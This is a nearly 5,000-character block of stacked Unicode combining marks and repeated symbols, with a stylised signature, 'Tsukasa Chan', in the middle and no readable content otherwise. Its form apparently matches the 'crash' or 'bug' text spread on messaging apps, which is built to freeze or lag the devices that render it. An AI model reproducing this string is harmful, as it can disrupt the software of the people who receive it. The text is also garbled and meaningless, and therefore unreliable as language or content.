⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝